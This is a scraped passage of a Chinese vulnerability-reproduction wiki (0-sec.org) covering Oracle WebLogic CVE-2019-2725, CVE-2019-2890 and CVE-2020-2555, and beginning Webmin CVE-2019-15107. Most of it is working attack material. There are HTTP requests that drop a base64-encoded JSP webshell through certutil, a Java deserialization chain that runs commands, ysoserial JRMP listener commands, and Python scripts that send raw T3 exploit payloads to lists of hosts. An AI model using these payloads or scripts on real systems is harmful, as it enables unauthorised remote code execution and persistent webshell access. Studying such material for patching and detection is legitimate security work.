/_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 1367 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx cmd /c echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= > servers\\AdminServer\\tmp\\_WL_internal\\bea_wls9_async_response\\8tpkys\\war\\webshell.txt POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 913 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx cmd /c certutil -decode servers\\AdminServer\\tmp\\_WL_internal\\bea_wls9_async_response\\8tpkys\\war\\webshell.txt servers\\AdminServer\\tmp\\_WL_internal\\bea_wls9_async_response\\8tpkys\\war\\webshell.jsp 这两组代码的webshell地址为：http://www.0-sec.org/_async/webshell.jsp?pwd=123&cmd=whoami 后两组代码 POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 1367 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx cmd /c echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= > servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell.txt POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 913 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx cmd /c certutil -decode servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell.txt servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell.jsp 这两组代码的webshell地址为：http://www.0-sec.org/bea_wls_internal/webshell.jsp?pwd=123&cmd=whoami 自动化脚本 https://github.com/ianxtianxt/CVE-2019-2725 cve2019-2725_weblogic_rce.bat http://192.168.31.5:7001 \"cat /etc/passwd\" 参考链接 https://mp.weixin.qq.com/s?__biz=MzA3NjU5MTIxMg==&mid=2650560530&idx=1&sn=86f5e0811c003c71965a4fc088f18100&chksm=87560111b02188071b9a60a36316b931770b0ed58b02b63d2d2428a5120d6809030d94031589&scene=21#wechat_redirect 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-15 22:40:06 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/（CVE-2019-2890）.html":{"url":"0day/Weblogic/（CVE-2019-2890）.html","title":"（CVE-2019-2890）","keywords":"","body":"（CVE-2019-2890） Weblogic T3 Analysis 一、漏洞简介 二、漏洞影响 WebLogic Server 10.3.6.0 WebLogic Server 12.1.3.0 WebLogic Server 12.2.1.3 三、复现过程 https://github.com/ianxtianxt/CVE-2019-2890 1.导入jar 网上有两篇文章都说了这么个构造思路，但是我阅读学习的时候，死在了导入jar这个难题下，因此在漏洞利用的开头，我列出几个jar文件，测试环境 weblogic 10.3.6 ，可能weblogic 12 jar名字有所不同。 com.bea.core.logging_1.9.0.0.jar com.bea.core.management.core_2.9.0.1.jar com.oracle.core.weblogic.msgcat_1.2.0.0.jar cryptoj.jar glassfish.jaxb_1.1.0.0_2-1-14.jar weblogic.jar wlthint3client.jar 2.重写PersistenContext类 因为需要用到 PersinstenContext 这个类，因此序列化的时候肯定要将其实例化，但是在下图代码位置有个if检查。 在这个if检查的结果会抛出 com.bea.core.security.managers.NotSupportedException 的异常导致反序列化中止。 因此这里解决办法就是绕过它，把它注释掉。 3.改造writeSubject中的writeObject 原先在 writeSubject 中正常写入的对象如下图所示。 这里我们需要将其替换掉，改成我们自己恶意对象，我的做法是构造恶意的JRMP对象。 int sep = command.indexOf(58); String host; int port; if (sep 4.改造加密问题 原先我们看到了，反序列化过程中有个解密过程，所以这里需要加密一下。首先加密过程有个KernelStatus.isServer()的判断。 if (KernelStatus.isServer()) { var5 = EncryptionUtil.encrypt(var5); } 会说我直接改造一下，把if去掉，让他直接EncryptionUtil.encrypt不就好了吗，但是跟进去之后会发现还是有个 Kernel.isServer() 的的判断。 public static byte[] encrypt(byte[] var0) { return Kernel.isServer() ? getEncryptionService().encryptBytes(var0) : var0; } 因此这里需要调用KernelStatus.setIsServer(true);，将状态设置为true。 当然这里还有另一种解法，我们实际上可以直接调用 var5 = EncryptionUtil.getEncryptionService().encryptBytes((byte []) var5); 但是有个小问题 getEncryptionService 是一个 private 方法，你需要重写一个把它变成public就可以直接调用了。 所以我重写了一个 EncryptionUtil ，并且将 getEncryptionService 设置为了 public 。 5.解决加密key的问题 在 weblogic.security.internal.SerializedSystemIni 存在一个加密的key，这个key实际上每个weblogic都不一样，所以官方给这个漏洞评价为授权状态下getshell，也是和之前的T3反序列化不太一样的地方，这里的解决办法就是你要复现那个weblogic，就找到他的 SerializedSystemIni.dat 文件，并且在自己的目录下创建一个 security 目录，放进去就好了。 6.最后一个小问题 在序列化的时候会出现卡死状态的，跟进之后发现原因在weblogic.security.subject.SubjectManager这个类里面。 在这个类里面的 getSubjectManager 方法会有一个 ceClient 的判断，如果为fasle就不会直接返回 ceSubjectManager 对象，因此需要让他为 true 。 而这个鬼东西默认情况下是false。 private static final boolean ceClient = \"true\".equalsIgnoreCase(System.getProperty(\"com.bea.core.internal.client\", \"false\")); 因此只需要System.setProperty(\"com.bea.core.internal.client\",\"true\");让他过去即可。 脚本使用说明 https://github.com/ianxtianxt/CVE-2019-2890 已经将相关jar文件都导入到了项目中，并且利用方式采用yso的JRMP，学习调试时候可以修改利用方式。 首先需要将weblogic下的 SerializedSystemIni.dat 文件放置到 security 文件夹下。 然后需要将yso重命名为 ysoserial.jar ，并且导入到 lib 目录下。 其次 weblogic/wsee/jaxws/persistence/PersistentContext.java 中的 getObject 的IP地址和端口。 try { var3.writeObject(Poc.getObject(\"127.0.0.1:8000\")); } catch (Exception e) { e.printStackTrace(); } 最后远程通过JRMP监听，利用7u21命令执行。 java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8000 Jdk7u21 \"calc.exe\" 使用方法，运行Poc.java生成poc.ser序列化文件，通过 python weblogic.py ip port poc.ser 2020/2/9 再次补充 再添加一个批量脚本 #!/usr/bin/python # -*- coding: utf-8 -*- # 2019-10-17 8:45 import socket import time import re import sys timeout = int(sys.argv[1]) VUL=['CVE-2019-2890'] PAYLOAD=['aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078'] VER_SIG=['\\\\$Proxy[0-9]+'] vul_no = [] vul_yes = [] vul_more_test = [] def t3handshake(sock,server_addr): print '正在连接服务器...' sock.connect(server_addr) sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex')) time.sleep(1) sock.recv(1024) def buildT3RequestObject(sock,port,server_addr): print '%s:%d连接成功，正在发送请求...' %(server_addr[0],server_addr[1]) data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371' data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(dport)) data3 = '1a7727000d3234322e323134' data4 = '2e312e32353461863d1d0000000078' for d in [data1,data2,data3,data4]: sock.send(d.decode('hex')) time.sleep(2) lendate = len(sock.recv(2048)) print '发送有效载荷请求成功,接收长度:%d'%(lendate) return lendate def sendEvilObjData(sock,data,lendate): print '正在执行载荷，请稍等...' payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000' payload+=data payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff' payload = '%s%s'%('{:08x}'.format(len(payload)/2 + 4),payload) sock.send(payload.decode('hex')) time.sleep(2) sock.send(payload.decode('hex')) res = '' start = time.time() try: while True: res += sock.recv(4096) time.sleep(0.1) end =time.time() timeend = end-start if lendate == 0 and timeend > timeout: break except Exception as e: pass return res def checkVul(res,server_addr,index): print '执行结果：' p=re.findall(VER_SIG[index], res, re.S) if len(p)>0: print '%s:%d 存在 %s 漏洞。'%(server_addr[0],server_addr[1],VUL[index]) vul_yes.append(server_addr) else: print '%s:%d 不存在 %s 漏洞。' % (server_addr[0],server_addr[1],VUL[index]) print '[+] You look like Cai Xukun when you play basketball' vul_no.append(server_addr) def run(index): with open(\"url.txt\",'r') as lists: for server_addr in lists: server_addr=server_addr.strip('\\n\\r') dip=server_addr.split(':')[0] global dport dport=int(server_addr.split(':')[1]) sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(15) server_addr = (dip, dport) try: t3handshake(sock,server_addr) except Exception as e: print '%s:%d连接失败，请检查IP是否存活...' %(server_addr[0],server_addr[1]) else: try: lendate = buildT3RequestObject(sock,dport,server_addr) rs=sendEvilObjData(sock,PAYLOAD[index],lendate) # print 'rs',rs except Exception as e: print '%s:%d请求频繁，请稍后自行单独测试...' %(server_addr[0],server_addr[1]) vul_more_test.append(server_addr) else: checkVul(rs,server_addr,index) finally: sock.close() print '='*50 print '检测完成！' print '以下IP存在CVE-2019-2890漏洞：' for yes in vul_yes: print '%s:%s' % (yes[0],yes[1]) print '='*50 print '以下IP不存在漏洞：' for no in vul_no: print '%s:%s' % (no[0],no[1]) print '='*50 print '以下IP请求频繁，需单独自行测试：' for more in vul_more_test: print '%s:%s' % (more[0],more[1]) print '='*50 if __name__==\"__main__\": run(0) 四、参考链接 https://xz.aliyun.com/t/6904#toc-1 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-09 00:45:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/CVE-2020-2555.html":{"url":"0day/Weblogic/CVE-2020-2555.html","title":"（CVE-2020-2555）Oracle Coherence&WebLogic 反序列化远程代码执行漏洞","keywords":"","body":"（CVE-2020-2555）Oracle Coherence&WebLogic 反序列化远程代码执行漏洞 一、漏洞简介 该反序列化的gadget存在与coherence包中。具体可以见分析 构造chain类似于common-collection的chain，可以照葫芦画瓢。 mvn 好像不能下载coherence包，很奇怪，直接下jar包就行。 反序列化的对象，通过t3发送给weblogic即可。所以，这个只是生成payload的工具 二、漏洞影响 Oracle Coherence 3.7.1.17 Oracle Coherence 12.1.3.0.0 Oracle Coherence 12.2.1.3.0 Oracle Coherence 12.2.1.4.0 三、复现过程 poc package org.example; import com.tangosol.util.ValueExtractor; import com.tangosol.util.extractor.ChainedExtractor; import com.tangosol.util.extractor.ReflectionExtractor; import com.tangosol.util.filter.AlwaysFilter; import com.tangosol.util.filter.LimitFilter; import javax.management.BadAttributeValueExpException; import java.io.*; /* Powered by UnicodeSec */ public class App { public static void main( String[] args ) throws IOException, ClassNotFoundException { ValueExtractor[] poc = new ValueExtractor[]{ new ReflectionExtractor(\"getMethod\", new Object[] { \"getRuntime\", new Class[0] }), new ReflectionExtractor(\"invoke\", new Object[] { null, new Object[0] }), new ReflectionExtractor(\"exec\", new String[]{\"calc\"}) }; ChainedExtractor chained = new ChainedExtractor(poc); LimitFilter limit = new LimitFilter(new AlwaysFilter(), 1); limit.setComparator(chained); limit.setTopAnchor(Runtime.class); BadAttributeValueExpException expException = new BadAttributeValueExpException(limit); // 序列化测试 ByteArrayOutputStream bytes = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bytes); oos.writeObject(expException); oos.close(); //反序列化 ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes.toByteArray())); BadAttributeValueExpException newUser = (BadAttributeValueExpException)ois.readObject(); System.out.println(newUser.toString()); } } jar包下载地址 http://www.0-sec.org/download/coherence-3.7.1 (1).jar.zip python 监测脚本 #!/usr/bin/python import socket import os import sys import struct if len(sys.argv) ' % os.path.basename(sys.argv[0]) sys.exit() sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(5) server_address = (sys.argv[1], int(sys.argv[2])) print '[+] Connecting to %s port %s' % server_address sock.connect(server_address) # Send headers headers='t3 12.2.1\\nAS:255\\nHL:19\\nMS:10000000\\nPU:t3://us-l-breens:7001\\n\\n' print 'sending \"%s\"' % headers sock.sendall(headers) data = sock.recv(1024) print >>sys.stderr, 'received \"%s\"' % data payloadObj = open(sys.argv[3],'rb').read() payload='\\x00\\x00\\x09\\xf3\\x01\\x65\\x01\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x71\\x00\\x00\\xea\\x60\\x00\\x00\\x00\\x18\\x43\\x2e\\xc6\\xa2\\xa6\\x39\\x85\\xb5\\xaf\\x7d\\x63\\xe6\\x43\\x83\\xf4\\x2a\\x6d\\x92\\xc9\\xe9\\xaf\\x0f\\x94\\x72\\x02\\x79\\x73\\x72\\x00\\x78\\x72\\x01\\x78\\x72\\x02\\x78\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x70\\x70\\x70\\x70\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x06\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\x73\\x54\\x61\\x62\\x6c\\x65\\x45\\x6e\\x74\\x72\\x79\\x2f\\x52\\x65\\x81\\x57\\xf4\\xf9\\xed\\x0c\\x00\\x00\\x78\\x70\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\xe6\\xf7\\x23\\xe7\\xb8\\xae\\x1e\\xc9\\x02\\x00\\x09\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x4c\\x00\\x09\\x69\\x6d\\x70\\x6c\\x54\\x69\\x74\\x6c\\x65\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x0a\\x69\\x6d\\x70\\x6c\\x56\\x65\\x6e\\x64\\x6f\\x72\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0b\\x69\\x6d\\x70\\x6c\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x03\\x78\\x70\\x77\\x02\\x00\\x00\\x78\\xfe\\x01\\x00\\x00' payload=payload+payloadObj payload=payload+'\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\x73\\x54\\x61\\x62\\x6c\\x65\\x45\\x6e\\x74\\x72\\x79\\x2f\\x52\\x65\\x81\\x57\\xf4\\xf9\\xed\\x0c\\x00\\x00\\x78\\x70\\x72\\x00\\x21\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x65\\x65\\x72\\x49\\x6e\\x66\\x6f\\x58\\x54\\x74\\xf3\\x9b\\xc9\\x08\\xf1\\x02\\x00\\x07\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x5b\\x00\\x08\\x70\\x61\\x63\\x6b\\x61\\x67\\x65\\x73\\x74\\x00\\x27\\x5b\\x4c\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2f\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2f\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2f\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\x3b\\x78\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x49\\x6e\\x66\\x6f\\x97\\x22\\x45\\x51\\x64\\x52\\x46\\x3e\\x02\\x00\\x03\\x5b\\x00\\x08\\x70\\x61\\x63\\x6b\\x61\\x67\\x65\\x73\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0e\\x72\\x65\\x6c\\x65\\x61\\x73\\x65\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x5b\\x00\\x12\\x76\\x65\\x72\\x73\\x69\\x6f\\x6e\\x49\\x6e\\x66\\x6f\\x41\\x73\\x42\\x79\\x74\\x65\\x73\\x74\\x00\\x02\\x5b\\x42\\x78\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\xe6\\xf7\\x23\\xe7\\xb8\\xae\\x1e\\xc9\\x02\\x00\\x09\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x4c\\x00\\x09\\x69\\x6d\\x70\\x6c\\x54\\x69\\x74\\x6c\\x65\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0a\\x69\\x6d\\x70\\x6c\\x56\\x65\\x6e\\x64\\x6f\\x72\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0b\\x69\\x6d\\x70\\x6c\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x05\\x78\\x70\\x77\\x02\\x00\\x00\\x78\\xfe\\x00\\xff\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x13\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x4a\\x56\\x4d\\x49\\x44\\xdc\\x49\\xc2\\x3e\\xde\\x12\\x1e\\x2a\\x0c\\x00\\x00\\x78\\x70\\x77\\x46\\x21\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x09\\x31\\x32\\x37\\x2e\\x30\\x2e\\x31\\x2e\\x31\\x00\\x0b\\x75\\x73\\x2d\\x6c\\x2d\\x62\\x72\\x65\\x65\\x6e\\x73\\xa5\\x3c\\xaf\\xf1\\x00\\x00\\x00\\x07\\x00\\x00\\x1b\\x59\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x78\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x13\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x4a\\x56\\x4d\\x49\\x44\\xdc\\x49\\xc2\\x3e\\xde\\x12\\x1e\\x2a\\x0c\\x00\\x00\\x78\\x70\\x77\\x1d\\x01\\x81\\x40\\x12\\x81\\x34\\xbf\\x42\\x76\\x00\\x09\\x31\\x32\\x37\\x2e\\x30\\x2e\\x31\\x2e\\x31\\xa5\\x3c\\xaf\\xf1\\x00\\x00\\x00\\x00\\x00\\x78' # adjust header for appropriate message length payload=struct.pack('>I',len(payload)) + payload[4:] print '[+] Sending payload...' sock.send(payload) data = sock.recv(1024) print >>sys.stderr, 'received \"%s\"' % data 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-09 16:35:15 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Webmin/1.html":{"url":"0day/Webmin/1.html","title":"（CVE-2019-15107）Webmin 远程命令执行漏洞","keywords":"","body":"（CVE-2019-15107）Webmin 远程命令执行漏洞 一、漏洞简介 Webmin是一个用于管理类Unix系统的管理配置工具，具有Web页面。在其找回密码页面中，存在一处无需权限的命令注入漏洞，通过这个漏洞攻击者即可以执行任意系统命令。 二、漏洞影响 Webmin 三、复现过程 环境搭建 执行如下命令，启动webmin 1.910： docker-compose up -d 执行完成后，访问https://0-sec.org:10000，忽略证书后即可看到webmin的登录页面。 复现 参考链接中的数据包是不对的，经过阅读代码可知，只有在发送的user参数的值不是已知Linux用户的情况下（而参考链接中是user=root），才会进入到修改/etc/shadow的地方，触发命令注入漏洞。 发送如下数据包，即可执行命令id： POST /password_change.cgi HTTP/1.1 Host: 0-sec.org:10000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Cookie: redirect=1; testing=1; sid=x; sessiontest=1 Referer: https://your-ip:10000/session_login.cgi Content-Type: application/x-www-form-urlencoded Content-Length: 60 